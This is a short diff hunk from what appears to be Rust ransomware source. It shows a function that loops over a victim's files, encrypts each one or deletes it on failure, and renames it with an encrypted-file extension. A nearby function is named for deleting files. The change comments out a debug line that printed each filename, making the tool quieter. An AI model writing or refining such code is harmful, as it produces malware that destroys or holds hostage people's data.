@@ -69,7 +69,7 @@ fn attempt_delete_file(path: &String) {
 
 fn encrypt_files(files: &Vec<String>, encryptor: &Encryptor) {
     for file in files {
-        println!("Name: {}", &file);
+        // println!("Name: {}", &file); // HACK DEBUG print
         encryptor.encrypt_file_else_delete(&file);
 
         match fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION) {
